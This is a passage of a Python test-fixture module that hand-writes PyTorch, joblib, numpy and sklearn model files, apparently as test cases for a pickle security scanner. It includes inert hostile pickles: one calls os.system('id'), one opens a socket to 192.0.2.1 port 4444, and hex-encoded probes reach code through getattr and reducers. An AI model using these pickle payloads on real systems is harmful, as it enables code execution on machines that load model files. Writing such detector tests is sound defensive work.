"""FP-MODEL-FILES: model files written in the tests as PyTorch, joblib, numpy, pandas and Lightning write them, with
the standard library only. Nothing here is a test, and nothing is ever unpickled or loaded.

The libraries are not installed for the suite (torch is too big): while a file is written, stand-in modules take
their names in sys.modules (`standins`), so that pickle records the real modules' and functions' names, as
torch.save, joblib.dump and numpy.save do; the entries are put back after. The bytes laid out around the pickles
(torch.save's zip and its legacy stream, joblib's arrays after their wrappers, an .npy's header) are written as those
libraries write them (torch/serialization.py, joblib/numpy_pickle.py, numpy/lib/format.py).

The hostile shapes are inert bytes: they name os.system and the like, with commands that are never run.
"""
import collections
import contextlib
import functools
import gzip
import io
import os
import pickle
import struct
import sys
import types
import zipfile
import zlib

__all__ = ["standins", "fn", "cls", "Storage", "Tensor", "tensor", "state_dict_pt", "full_model_pt",
           "lightning_ckpt", "legacy_pt", "plain_pickle", "joblib_dump", "npy", "npz", "torch_zip", "hostile",
           "os_system", "stack_global_system", "build_setstate", "Reduce", "Member", "STD_MEMBERS", "STD_FORMS",
           "std_members", "std_member_shapes"]


@contextlib.contextmanager
def standins(names):
    """`names`: {"module": {"name": object}}: each module (and its packages) made in sys.modules, the objects set on
    it; what sys.modules held before is put back."""
    saved, made = {}, {}
    for mod in names:
        parts = mod.split(".")
        for k in range(1, len(parts) + 1):
            m = ".".join(parts[:k])
            if m not in made:
                saved.setdefault(m, sys.modules.get(m))
                made[m] = types.ModuleType(m)
                sys.modules[m] = made[m]
            if k > 1:
                setattr(made[".".join(parts[:k - 1])], parts[k - 1], made[m])
    for mod, objs in names.items():
        for name, obj in objs.items():
            target = made[mod]
            path = name.split(".")
            for p in path[:-1]:
                target = getattr(target, p)
            setattr(target, path[-1], obj)
    try:
        yield made
    finally:
        for m, old in saved.items():
            if old is None:
                sys.modules.pop(m, None)
            else:
                sys.modules[m] = old


def fn(module, name):
    """A function named module.name (it is never called)."""
    def f(*args, **kwargs):
        raise AssertionError("a stand-in is never called")
    f.__module__, f.__qualname__, f.__name__ = module, name, name.rsplit(".", 1)[-1]
    return f


def cls(module, name, base=object, **ns):
    return type(name.rsplit(".", 1)[-1], (base,), {"__module__": module, "__qualname__": name, **ns})


class Reduce:
    """An object that pickles as `callable(*args)` (with a BUILD of `state` when given)."""

    def __init__(self, callable_, args, state=None):
        self.callable_, self.args, self.state = callable_, args, state

    def __reduce__(self):
        if self.state is None:
            return self.callable_, self.args
        return self.callable_, self.args, self.state


# ---- PyTorch ------------------------------------------------------------------------------------------------------

REBUILD_V2 = fn("torch._utils", "_rebuild_tensor_v2")
REBUILD_PARAM = fn("torch._utils", "_rebuild_parameter")
FLOAT_STORAGE = cls("torch", "FloatStorage")
TORCH = {"torch._utils": {"_rebuild_tensor_v2": REBUILD_V2, "_rebuild_parameter": REBUILD_PARAM},
         "torch": {"FloatStorage": FLOAT_STORAGE}}


class Storage:
    """A tensor's storage: torch.save pickles it as a persistent id."""

    def __init__(self, key, numel):
        self.key, self.numel = key, numel


def tensor(storage, shape, stride, param=False):
    t = Reduce(REBUILD_V2, (storage, 0, tuple(shape), tuple(stride), False, collections.OrderedDict()))
    return Reduce(REBUILD_PARAM, (t, True, collections.OrderedDict())) if param else t


Tensor = tensor


class _TorchPickler(pickle.Pickler):
    def persistent_id(self, obj):
        if isinstance(obj, Storage):
            return ("storage", FLOAT_STORAGE, obj.key, "cpu", obj.numel)
        return None


def _torch_pickle(obj, extra=None):
    buf = io.BytesIO()
    with standins({**TORCH, **(extra or {})}):
        _TorchPickler(buf, protocol=2).dump(obj)
    return buf.getvalue()


def torch_zip(data_pkl, storages=(), name="archive", more=()):
    """torch.save's archive: <name>/data.pkl first, its records, each storage's bytes, the writer's own records."""
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr(f"{name}/data.pkl", data_pkl)
        z.writestr(f"{name}/.format_version", "1")
        z.writestr(f"{name}/.storage_alignment", "64")
        z.writestr(f"{name}/byteorder", "little")
        for key, raw in storages:
            z.writestr(f"{name}/data/{key}", raw)
        for n, raw in more:
            z.writestr(n, raw)
        z.writestr(f"{name}/version", "3\n")
        z.writestr(f"{name}/.data/serialization_id", "1234567890123456789012345678901234567890")
    return out.getvalue()


# ---- a checkpoint of large storages, never held whole (John's decision of Oct 21: read by range) ----------------

@functools.lru_cache(maxsize=None)
def _crc_zeros(n):
    crc, chunk = 0, bytes(1 << 20)
    while n:
        k = min(n, len(chunk))
        crc = zlib.crc32(chunk if k == len(chunk) else chunk[:k], crc)
        n -= k
    return crc


def big_torch_zip(data_pkl, storage_sizes, name="archive", more=()):
    """torch.save's archive (stored, as torch.save writes it) whose storages are `storage_sizes` bytes of zeros each,
    as parts: [bytes, or the length of a run of zeros], to write as a sparse file (write_parts) or stream into an
    archive (PartsReader); zip64 where sizes or offsets pass 4 GiB. `more`: (name, bytes) entries after the storages."""
    entries = [(f"{name}/data.pkl", data_pkl), (f"{name}/.format_version", b"1"), (f"{name}/.storage_alignment", b"64"),
               (f"{name}/byteorder", b"little")]
    entries += [(f"{name}/data/{k}", n) for k, n in enumerate(storage_sizes)]
    entries += list(more)
    entries += [(f"{name}/version", b"3\n"), (f"{name}/.data/serialization_id", b"1234567890")]
    parts, pos, cd, z64 = [], 0, b"", False
    big = 0xFFFFFFFF
    for fname, body in entries:
        n = body if isinstance(body, int) else len(body)
        crc = _crc_zeros(body) if isinstance(body, int) else zlib.crc32(body)
        fn = fname.encode()
        wide, far = n >= big, pos >= big
        z64 |= wide or far
        lx = struct.pack("<HHQQ", 1, 16, n, n) if wide else b""
        m = big if wide else n
        parts.append(struct.pack("<4s5H3L2H", b"PK\x03\x04", 45, 0, 0, 0, 0, crc, m, m, len(fn), len(lx)) + fn + lx)
        parts.append(body)
        x = (struct.pack("<QQ", n, n) if wide else b"") + (struct.pack("<Q", pos) if far else b"")
        cx = struct.pack("<HH", 1, len(x)) + x if x else b""
        cd += struct.pack("<4s6H3L5H2L", b"PK\x01\x02", 45, 45, 0, 0, 0, 0, crc, m, m, len(fn), len(cx), 0, 0, 0, 0,
                          big if far else pos) + fn + cx
        pos += 30 + len(fn) + len(lx) + n
    count = len(entries)
    if z64 or pos >= big:
        end = struct.pack("<4sQ2H2L4Q", b"PK\x06\x06", 44, 45, 45, 0, 0, count, count, len(cd), pos)
        end += struct.pack("<4sLQL", b"PK\x06\x07", 0, pos + len(cd), 1)
        end += struct.pack("<4s4H2LH", b"PK\x05\x06", 0, 0, 0xFFFF, 0xFFFF, big, big, 0)
    else:
        end = struct.pack("<4s4H2LH", b"PK\x05\x06", 0, 0, count, count, len(cd), pos, 0)
    parts.append(cd + end)
    return parts


def parts_size(parts):
    return sum(p if isinstance(p, int) else len(p) for p in parts)


def write_parts(path, parts):
    """The parts as a file, its runs of zeros holes (a sparse file: it takes the disk its bytes take)."""
    with open(path, "wb") as fh:
        for p in parts:
            if isinstance(p, int):
                fh.seek(p, os.SEEK_CUR)
            else:
                fh.write(p)
        fh.truncate()


class PartsReader(io.RawIOBase):
    """The parts read one chunk at a time (a member streamed into a tar or a zip), never held whole."""

    def __init__(self, parts):
        self.parts, self.k, self.at = list(parts), 0, 0

    def readable(self):
        return True

    def readinto(self, b):
        while self.k < len(self.parts):
            p = self.parts[self.k]
            n = p if isinstance(p, int) else len(p)
            if self.at < n:
                take = min(len(b), n - self.at)
                b[:take] = bytes(take) if isinstance(p, int) else p[self.at:self.at + take]
                self.at += take
                return take
            self.k, self.at = self.k + 1, 0
        return 0


def state_dict_pt(name="archive"):
    """torch.save(model.state_dict()): an OrderedDict of tensors, with its _metadata."""
    s0, s1 = Storage("0", 6), Storage("1", 2)
    sd = collections.OrderedDict([("fc.weight", tensor(s0, (2, 3), (3, 1))), ("fc.bias", tensor(s1, (2,), (1,)))])
    sd._metadata = collections.OrderedDict([("", {"version": 1}), ("fc", {"version": 1})])
    return torch_zip(_torch_pickle(sd), [("0", bytes(24)), ("1", bytes(8))], name)


def full_model_pt(module="mymodel", name="archive"):
    """torch.save(model): the model's class and torch.nn's remade by NEWOBJ and BUILD, its parameters rebuilt."""
    linear = cls("torch.nn.modules.linear", "Linear")
    net = cls(module, "Net")
    lin = linear.__new__(linear)
    lin.__dict__.update({"training": True, "_parameters": collections.OrderedDict(
        [("weight", tensor(Storage("0", 6), (2, 3), (3, 1), param=True))]), "_buffers": collections.OrderedDict(),
        "_modules": collections.OrderedDict(), "in_features": 3, "out_features": 2})
    m = net.__new__(net)
    m.__dict__.update({"training": True, "_parameters": collections.OrderedDict(), "_buffers": collections.OrderedDict(),
                       "_modules": collections.OrderedDict([("fc", lin)]), "_forward_hooks": collections.OrderedDict()})
    data = _torch_pickle(m, {"torch.nn.modules.linear": {"Linear": linear}, module: {"Net": net}})
    return torch_zip(data, [("0", bytes(24))], name)


def lightning_ckpt():
    """A Lightning checkpoint: its loops, callbacks and optimizer states, and hyperparameters of plain data (an
    AttributeDict, a Namespace, paths, an omegaconf DictConfig, typing objects)."""
    import argparse
    import pathlib
    import typing
    attrdict = cls("lightning.fabric.utilities.data", "AttributeDict", dict)
    dictconfig = cls("omegaconf.dictconfig", "DictConfig")
    metadata = cls("omegaconf.base", "ContainerMetadata")
    anynode = cls("omegaconf.nodes", "AnyNode")
    meta = metadata.__new__(metadata)
    meta.__dict__.update({"ref_type": typing.Any, "object_type": dict, "optional": True, "key": None, "flags": {},
                          "flags_root": False, "resolver_cache": collections.defaultdict(dict), "key_type": typing.Any,
                          "element_type": typing.Any})
    node = anynode.__new__(anynode)
    node.__dict__.update({"_val": 64, "_metadata": None, "_parent": None})
    cfg = dictconfig.__new__(dictconfig)
    cfg.__dict__.update({"_metadata": meta, "_parent": None, "_content": {"hidden": node}, "_flags_cache": None})
    hp = attrdict(lr=1e-3, hidden=64, data_dir=pathlib.PurePosixPath("/data/train"),
                  args=argparse.Namespace(batch_size=32, precision="16-mixed"), cfg=cfg,
                  schedule=typing.Optional[int])
    s = Storage("0", 6)
    ckpt = {
        "epoch": 3, "global_step": 120, "pytorch-lightning_version": "2.4.0",
        "state_dict": collections.OrderedDict([("model.w", tensor(s, (2, 3), (3, 1)))]),
        "loops": {"fit_loop": {"state_dict": {}, "epoch_progress": {"total": {"ready": 4, "completed": 3}}}},
        "callbacks": {"ModelCheckpoint{'monitor': 'val_loss', 'mode': 'min'}": {
            "monitor": "val_loss", "best_model_score": tensor(Storage("1", 1), (), ()),
            "best_model_path": "/ckpt/epoch=3-step=120.ckpt", "dirpath": "/ckpt", "kth_best_model_path": "",
            "best_k_models": {"/ckpt/epoch=3-step=120.ckpt": tensor(Storage("1", 1), (), ())}}},
        "optimizer_states": [{"state": {0: {"step": tensor(Storage("2", 1), (), ()),
                                            "exp_avg": tensor(Storage("3", 6), (2, 3), (3, 1))}},
                              "param_groups": [{"lr": 1e-3, "betas": (0.9, 0.999), "eps": 1e-8, "params": [0]}]}],
        "lr_schedulers": [{"step_size": 10, "gamma": 0.1, "base_lrs": [1e-3], "last_epoch": 3}],
        "hparams_name": "kwargs", "hyper_parameters": hp,
    }
    data = _torch_pickle(ckpt, {"lightning.fabric.utilities.data": {"AttributeDict": attrdict},
                                "omegaconf.dictconfig": {"DictConfig": dictconfig},
                                "omegaconf.base": {"ContainerMetadata": metadata},
                                "omegaconf.nodes": {"AnyNode": anynode}})
    return torch_zip(data, [(k, bytes(24)) for k in "0123"], "epoch=3-step=120")


MAGIC = 0x1950A86A20F9469CFC6C


def legacy_pt(obj=None):
    """torch.save(..., _use_new_zipfile_serialization=False): the magic number, the protocol version, the system's
    sizes, the object, the storage keys (each a pickle), then each storage's numel and bytes."""
    if obj is None:
        obj = collections.OrderedDict([("w", tensor(Storage("0", 4), (4,), (1,)))])
    out = io.BytesIO()
    for head in (MAGIC, 1001, {"protocol_version": 1001, "little_endian": True,
                               "type_sizes": {"short": 2, "int": 4, "long": 4}}):
        pickle.dump(head, out, protocol=2)
    with standins(TORCH):
        _TorchPickler(out, protocol=2).dump(obj)
    pickle.dump(["0"], out, protocol=2)
    out.write(struct.pack("<q", 4) + bytes(16))
    return out.getvalue()


def plain_pickle(obj, protocol=4, extra=None):
    with standins(extra or {}):
        return pickle.dumps(obj, protocol=protocol)


# ---- numpy, joblib -----------------------------------------------------------------------------------------------

def _numpy(two=True):
    core = "numpy._core" if two else "numpy.core"
    return {f"{core}.multiarray": {"_reconstruct": fn(f"{core}.multiarray", "_reconstruct"),
                                   "scalar": fn(f"{core}.multiarray", "scalar")},
            "numpy": {"ndarray": cls("numpy", "ndarray"), "dtype": fn("numpy", "dtype")}}


def _dtype(np, descr, elsize=-1, flags=0, order="<"):
    return Reduce(np["numpy"]["dtype"], (descr, False, True), (3, order, None, None, None, elsize, -1, flags))


def _object_array(np, items, two=True):
    """An object array as ndarray.__reduce__ pickles it: _reconstruct, then a BUILD of its items."""
    core = "numpy._core" if two else "numpy.core"
    return Reduce(np[f"{core}.multiarray"]["_reconstruct"], (np["numpy"]["ndarray"], (0,), b"b"),
                  (1, (len(items),), _dtype(np, "O8", 8, 63, "|"), False, list(items)))


def npy(descr, payload, shape=(3,)):
    """An .npy (format version 1.0): its header, then `payload` (an array's bytes, or an object array's pickle)."""
    header = "{'descr': %r, 'fortran_order': False, 'shape': %r, }" % (descr, shape)
    pad = 64 - (10 + len(header) + 1) % 64
    header = (header + " " * pad + "\n").encode("latin-1")
    return b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header)) + header + payload


def npy_objects(items, two=True):
    np = _numpy(two)
    with standins(np):
        return npy("|O", pickle.dumps(_object_array(np, items, two), protocol=3))


def npz(members, compressed=False):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED if compressed else zipfile.ZIP_STORED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return out.getvalue()


class _Array:
    """An array for joblib_dump: its dtype descr, shape and bytes (or its objects)."""

    def __init__(self, descr, shape, raw=b"", objects=None):
        self.descr, self.shape, self.raw, self.objects = descr, shape, raw, objects


def joblib_dump(obj, compress=None, aligned=True, extra=None, two=True):
    """joblib.dump: the object pickled (protocol 4 as joblib's NumpyPickler: framed), each array replaced by a
    NumpyArrayWrapper whose BUILD is followed by its bytes (a padding byte, the padding, the data; or an object
    array's own pickle); compressed with zlib or gzip when asked."""
    np = _numpy(two)
    wrapper = cls("joblib.numpy_pickle", "NumpyArrayWrapper")
    mods = {**np, "joblib.numpy_pickle": {"NumpyArrayWrapper": wrapper}, **(extra or {})}
    out = io.BytesIO()

    class P(pickle._Pickler):
        def save(self, o, save_persistent_id=True):
            if isinstance(o, _Array):
                w = wrapper.__new__(wrapper)
                objects = o.objects is not None
                w.__dict__.update({"subclass": np["numpy"]["ndarray"], "shape": o.shape, "order": "C",
                                   "dtype": _dtype(np, "O8", 8, 63, "|") if objects else _dtype(np, o.descr),
                                   "allow_mmap": not objects})
                if aligned:
                    w.__dict__["numpy_array_alignment_bytes"] = 16
                pickle._Pickler.save(self, w)
                self.framer.commit_frame(force=True)
                if objects:
                    pickle.dump(_object_array(np, o.objects, two), out, protocol=5)
                else:
                    f = out
                    if aligned:
                        pos = f.tell() + 1
                        pad = 16 - pos % 16
                        f.write(bytes([pad]) + b"\xff" * pad)
                    f.write(o.raw)
                return
            return pickle._Pickler.save(self, o, save_persistent_id)

    with standins(mods):
        P(out, protocol=4).dump(obj)
    data = out.getvalue()
    if compress == "zlib":
        return zlib.compress(data, 3)
    if compress == "gzip":
        return gzip.compress(data, 3)
    return data


def sklearn_tree():
    """A fitted DecisionTreeClassifier as sklearn pickles it: the estimator remade by NEWOBJ and BUILD, its Tree
    called with numbers and an array (Tree.__reduce__), its arrays joblib's."""
    est = cls("sklearn.tree._classes", "DecisionTreeClassifier")
    tree = fn("sklearn.tree._tree", "Tree")
    e = est.__new__(est)
    t = Reduce(tree, (4, _Array("i8", (1,), struct.pack("<q", 2)), 1),
               {"max_depth": 1, "node_count": 3, "nodes": _Array("V64", (3,), bytes(192)),
                "values": _Array("f8", (3, 1, 2), bytes(48))})
    e.__dict__.update({"criterion": "gini", "splitter": "best", "max_depth": None, "random_state": 0,
                       "n_features_in_": 4, "classes_": _Array("i8", (2,), struct.pack("<qq", 0, 1)),
                       "tree_": t, "_sklearn_version": "1.9.1"})
    return joblib_dump(e, extra={"sklearn.tree._classes": {"DecisionTreeClassifier": est},
                                 "sklearn.tree._tree": {"Tree": tree}})


# ---- the standard library's enum members, as each Python writes them (FP-MODEL-FILES-PY311) ------------------------

class Member(collections.namedtuple("Member", "module cls name value converted")):
    """A member of one of the standard library's data enums: `converted`, its class made by IntEnum/IntFlag._convert_,
    which exports the members at module level (signal.SIGTERM is signal.Signals.SIGTERM)."""


# (the values are Linux's; the bytes, not the platform, are what the tests read)
STD_MEMBERS = (
    Member("signal", "Signals", "SIGTERM", 15, True), Member("signal", "Signals", "SIGINT", 2, True),
    Member("signal", "Handlers", "SIG_DFL", 0, True), Member("signal", "Handlers", "SIG_IGN", 1, True),
    Member("signal", "Sigmasks", "SIG_BLOCK", 0, True),
    Member("socket", "AddressFamily", "AF_INET", 2, True), Member("socket", "AddressFamily", "AF_INET6", 10, True),
    Member("socket", "SocketKind", "SOCK_STREAM", 1, True), Member("socket", "MsgFlag", "MSG_PEEK", 2, True),
    Member("socket", "AddressInfo", "AI_PASSIVE", 1, True),
    Member("ssl", "VerifyMode", "CERT_REQUIRED", 2, True), Member("ssl", "_SSLMethod", "PROTOCOL_TLS_CLIENT", 16, True),
    Member("ssl", "Options", "OP_NO_COMPRESSION", 131072, True), Member("ssl", "VerifyFlags", "VERIFY_X509_STRICT", 32, True),
    Member("ssl", "AlertDescription", "ALERT_DESCRIPTION_HANDSHAKE_FAILURE", 40, True),
    Member("ssl", "SSLErrorNumber", "SSL_ERROR_EOF", 8, True),
    Member("ssl", "TLSVersion", "TLSv1_2", 771, False),
)

# How each Python pickles a member (enum.py): 3.10 a converted enum's by its module-level name (_reduce_ex_by_name),
# another's as its class called with its value; 3.11.0 to 3.11.4 a converted enum's by its module-level name
# (_reduce_ex_by_global_name), another's as getattr(<its class>, '<its name>'); 3.11.5 and later, 3.12 to 3.14, every
# member as its class called with its value.
STD_FORMS = ("3.10", "3.11.0", "3.12")


class _Writer:
    """Opcodes as CPython's pickler writes them for a list of members: its memo (PUT, BINPUT, MEMOIZE; a module's name
    or a class saved once), framing from protocol 4, Python 2's __builtin__ before protocol 3. Bytes only."""

    def __init__(self, protocol):
        self.proto, self.out, self.memo = protocol, bytearray(), {}

    def put(self, key):
        i = self.memo[key] = len(self.memo)
        if self.proto >= 4:
            self.out += b"\x94"
        elif self.proto == 0:
            self.out += b"p%d\n" % i
        else:
            self.out += b"q" + bytes([i]) if i < 256 else b"r" + struct.pack("<I", i)

    def got(self, key):
        if key not in self.memo:
            return False
        i = self.memo[key]
        if self.proto == 0:
            self.out += b"g%d\n" % i
        else:
            self.out += b"h" + bytes([i]) if i < 256 else b"j" + struct.pack("<I", i)
        return True

    def text(self, t):
        if self.got(("str", t)):
            return
        b = t.encode()
        if self.proto == 0:
            self.out += b"V" + b + b"\n"
        elif self.proto >= 4 and len(b) < 256:
            self.out += b"\x8c" + bytes([len(b)]) + b
        else:
            self.out += b"X" + struct.pack("<I", len(b)) + b
        self.put(("str", t))

    def int(self, n):
        if self.proto == 0:
            self.out += b"I%d\n" % n
        elif 0 <= n < 256:
            self.out += b"K" + bytes([n])
        elif 0 <= n < 65536:
            self.out += b"M" + struct.pack("<H", n)
        else:
            self.out += b"J" + struct.pack("<i", n)

    def glob(self, module, name, key=None):
        """GLOBAL (STACK_GLOBAL from protocol 4), memoized as the object it names (`key`: a member's own)."""
        key = key or ("global", module, name)
        if self.got(key):
            return
        if self.proto >= 4:
            self.text(module)
            self.text(name)
            self.out += b"\x93"
        else:
            m = "__builtin__" if module == "builtins" and self.proto < 3 else module
            self.out += b"c" + m.encode() + b"\n" + name.encode() + b"\n"
        self.put(key)

    def tuple(self, items):
        if self.proto >= 2:
            for f in items:
                f()
            self.out += bytes([0x84 + len(items)])
        else:
            self.out += b"("
            for f in items:
                f()
            self.out += b"t"
        self.put(("tuple", len(self.memo)))

    def member(self, m, form):
        if self.got(("member", m)):
            return
        if m.converted and form in ("3.10", "3.11.0"):
            self.glob(m.module, m.name, ("member", m))               # signal.SIGTERM
            return
        if form == "3.11.0":
            self.glob("builtins", "getattr")                         # getattr(ssl.TLSVersion, 'TLSv1_2')
            self.tuple([lambda: self.glob(m.module, m.cls), lambda: self.text(m.name)])
            self.out += b"R"
        else:
            self.glob(m.module, m.cls)                               # signal.Signals(15)
            self.tuple([lambda: self.int(m.value)])
            self.out += b"R"
        self.put(("member", m))

    def pickle(self, members, form):
        self.out += b"(l" if self.proto == 0 else b"]"
        self.put(("list",))
        if self.proto == 0 or len(members) == 1:
            for m in members:
                self.member(m, form)
                self.out += b"a"
        elif members:
            self.out += b"("
            for m in members:
                self.member(m, form)
            self.out += b"e"
        self.out += b"."
        head = b"\x80" + bytes([self.proto]) if self.proto >= 2 else b""
        if self.proto >= 4:
            head += b"\x95" + struct.pack("<Q", len(self.out))
        return head + bytes(self.out)


def std_members(members=STD_MEMBERS, protocol=2, form="3.10"):
    """A list of the standard library's enum members pickled as the Python of `form` (STD_FORMS) writes it at
    `protocol`, whatever Python runs the tests: 3.10's and 3.11.0's GLOBAL 'signal SIGTERM', 3.11.0's getattr(
    ssl.TLSVersion, 'TLSv1_2'), 3.12's signal.Signals(15). Hand-built bytes (checked against those Pythons' own
    pickle.dumps when they were written)."""
    return _Writer(protocol).pickle(list(members), form)


def std_member_shapes():
    """Each use of a member a pickle can make (FP-MODEL-FILES-PY311), hand-built: kept as data (quiet), and called,
    made, changed or reached through (SC-PICKLE-CODE, as before). {name: (bytes, quiet)}."""
    g = lambda m, n: b"c" + m.encode() + b"\n" + n.encode() + b"\n"
    su = lambda t: b"\x8c" + bytes([len(t)]) + t.encode()
    p2 = b"\x80\x02"
    return {
        # kept: in a dict, as a dict's key, as an argument, as a BUILD's state, memoized and fetched again
        "kept_dict.pkl": (p2 + b"}" + su("sig") + g("signal", "SIGTERM") + b"s" + su("fam") + g("socket", "AF_INET")
                          + b"s.", True),
        "kept_key.pkl": (p2 + b"}" + g("signal", "SIGINT") + su("interrupt") + b"s.", True),
        "kept_argument.pkl": (p2 + g("collections", "OrderedDict") + su("mode") + g("ssl", "CERT_REQUIRED")
                              + b"\x86\x85\x85R.", True),
        "kept_state.pkl": (p2 + g("argparse", "Namespace") + b")\x81}" + su("sig") + g("signal", "SIG_DFL") + b"sb.",
                           True),
        "kept_state_keys.pkl": (p2 + g("argparse", "Namespace") + b")\x81}" + su("handlers") + b"}" + g("signal", "SIGTERM")
                                + g("signal", "SIG_DFL") + b"ss" + b"b.", True),
        "kept_memo.pkl": (b"(lp0\ncsignal\nSIGTERM\np1\nag1\na.", True),
        "kept_stack_global.pkl": (b"\x80\x04" + su("socket") + b"\x94" + su("SOCK_STREAM") + b"\x94\x93\x94\x85.",
                                  True),
        "kept_getattr.pkl": (p2 + g("__builtin__", "getattr") + g("ssl", "TLSVersion") + su("TLSv1_2") + b"\x86R\x85.",
                             True),
        # called, made, changed, reached through: as before
        "called_reduce.pkl": (p2 + g("signal", "SIGTERM") + b")R.", False),
        "called_with_text.pkl": (p2 + g("socket", "AF_INET") + su("192.0.2.1") + b"\x85R.", False),
        "called_inst.pkl": (b"(isignal\nSIG_DFL\n.", False),
        "called_obj.pkl": (p2 + b"(" + g("socket", "SOCK_STREAM") + b"o.", False),
        "called_stack_global.pkl": (b"\x80\x04" + su("signal") + su("SIGKILL") + b"\x93)R.", False),
        "called_getattr_member.pkl": (p2 + g("__builtin__", "getattr") + g("ssl", "TLSVersion") + su("TLSv1_2")
                                      + b"\x86R)R.", False),
        "made_newobj.pkl": (p2 + g("ssl", "CERT_REQUIRED") + b")\x81.", False),
        "made_reconstructor.pkl": (p2 + g("copyreg", "_reconstructor") + g("signal", "SIGTERM")
                                   + g("__builtin__", "object") + b"N\x87R.", False),
        "called_reconstructor_base.pkl": (p2 + g("copyreg", "_reconstructor") + g("argparse", "Namespace")
                                          + g("signal", "SIGTERM") + su("x") + b"\x87R.", False),
        "changed_build.pkl": (p2 + g("signal", "SIGTERM") + b"}" + su("value") + b"K\x01sb.", False),
        "given_setstate.pkl": (p2 + g("argparse", "Namespace") + b")\x81}" + su("__setstate__")
                               + g("signal", "SIGTERM") + b"sb" + su("id") + b"b.", False),
        "reached_getattr.pkl": (p2 + g("__builtin__", "getattr") + g("signal", "SIGTERM") + su("__class__")
                                + b"\x86RK\x0f\x85R.", False),
        "reached_dotted.pkl": (b"\x80\x04" + su("signal") + su("SIGTERM.__class__") + b"\x93\x85.", False),
        "signal_signal.pkl": (p2 + g("signal", "signal") + g("signal", "SIGTERM") + g("os", "system") + b"\x86R.", False),
        "socket_connect.pkl": (p2 + g("__builtin__", "getattr") + g("socket", "socket") + g("socket", "AF_INET")
                               + g("socket", "SOCK_STREAM") + b"\x86R" + su("connect") + b"\x86R" + su("192.0.2.1")
                               + b"M\x5c\x11\x86\x85R.", False),
        "os_system.pkl": (p2 + g("os", "system") + su("id") + b"\x85R.", False),
        # (the review of Oct 29) called through an object the pickle computed, changed by SETITEM or APPEND, and the
        # getattr form's name split after its class (GLOBAL 'ssl.TLSVersion' 'TLSv1_2' imports no module)
        "called_partial.pkl": (p2 + g("functools", "partial") + g("signal", "SIGTERM") + b"\x85R)R.", False),
        "called_itemgetter.pkl": (p2 + g("operator", "itemgetter") + b"K\x00\x85R" + g("signal", "SIGTERM")
                                  + b"\x85\x85R)R.", False),
        "changed_setitem.pkl": (p2 + g("signal", "SIGTERM") + b"K\x01K\x02s.", False),
        "changed_append.pkl": (p2 + g("socket", "AF_INET") + b"K\x01a.", False),
        "near_module_side.pkl": (p2 + g("ssl.TLSVersion", "TLSv1_2") + b"\x85.", False),
        # names that are no member's exactly, kept as data: as before
        "near_sigtermx.pkl": (p2 + g("signal", "SIGTERMX") + b"\x85.", False),
        "near_signal_signal.pkl": (p2 + g("signal", "signal") + b"\x85.", False),
        "near_socket_socket.pkl": (p2 + g("socket", "socket") + b"\x85.", False),
        "near_class_member.pkl": (p2 + g("signal", "Signals.SIGTERM") + b"\x85.", False),
        "other_module_signal.pkl": (p2 + g("_signal", "SIGTERM") + b"\x85.", False),
        "other_module_ssl.pkl": (p2 + g("ssl", "SOCK_STREAM") + b"\x85.", False),
        "other_module_http_client.pkl": (p2 + g("http.client", "OK") + b"\x85.", False),
        # (the re-review of Oct 30) the dotted name protocol 4's find_class walks (GLOBAL 'ssl' 'TLSVersion.TLSv1_2'):
        # data, as the getattr form is; and the re-review's probes, byte for byte, code as on base
        "kept_dotted_proto4.pkl": (b"\x80\x04" + g("ssl", "TLSVersion.TLSv1_2") + b"\x85.", True),
        **{f"{k}.pkl": (bytes.fromhex(h), False) for k, h in REREVIEW_311.items()},
        # (round 3) the re-check's probes, byte for byte, code as on base
        **{f"{k}.pkl": (bytes.fromhex(h), False) for k, h in RECHECK_311.items()},
        # (round 4) re-check 3's probes, code as on base, and its precision files, written by Python's pickler, quiet
        **{f"{k}.pkl": (bytes.fromhex(h), False) for k, h in RECHECK3_311.items()},
        **{f"{k}.pkl": (bytes.fromhex(h), True) for k, h in PRECISION3_311.items()},
        # (round 5) re-check 4's precision files, quiet, and its residuals, code as on base (p10 quiet since round 6)
        **{f"{k}.pkl": (bytes.fromhex(h), True) for k, h in PRECISION4_311.items()},
        **{f"{k}.pkl": (bytes.fromhex(h), False) for k, h in RESIDUAL4_311.items()},
        # (round 6) re-check 5's states of pairs keyed by what the pickle computes, holding a member: quiet
        **{f"{k}.pkl": (bytes.fromhex(h), True) for k, h in PRECISION5_311.items()},
    }


# The re-review of Oct 30's probes (hand-built, never loaded): a member an object was given as the extend, append or
# add that APPEND, APPENDS or ADDITEMS call (a01 to a09: pickle's load_append, load_appends and load_additems look
# them up on the object), a member as the class a constructor makes an object of (numpy's _reconstruct and
# _mareconstruct, array's _array_reconstructor, numpy's __pyx_unpickle_SeedSequence, torch's
# _rebuild_wrapper_subclass: b01 to b07), and a member's dotted name where Python looks it up with a plain getattr
# (GLOBAL below protocol 4, numpy's _ufunc_reconstruct: k01, k02, k04). Python raises at each; each is SC-PICKLE-CODE.
REREVIEW_311 = {
    "a01_od_extend_append_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a73624b01612e",
    "a02_od_append_append_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06617070656e64637369676e616c0a5349475445524d0a73624b01612e",
    "a03_od_extend_appends_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a7362284b014b02652e",
    "a04_od_add_additems_member": "800463636f6c6c656374696f6e730a4f726465726564446963740a29527d8c03616464637369676e616c0a5349475445524d0a7362284b01902e",
    "a05_od_slots_extend_append_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c06657874656e64637369676e616c0a5349475445524d0a7386624b01612e",
    "a06_ns_extend_append_member": "80026361726770617273650a4e616d6573706163650a29817d8c06657874656e64637369676e616c0a5349475445524d0a73624b01612e",
    "a07_od_extend_getattr_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64636275696c74696e730a676574617474720a6373736c0a544c5356657273696f6e0a8c07544c5376315f32865273624b01612e",
    "a08_ns_extend_af_inet_appends": "80026361726770617273650a4e616d6573706163650a29817d8c06657874656e6463736f636b65740a41465f494e45540a7362284b01652e",
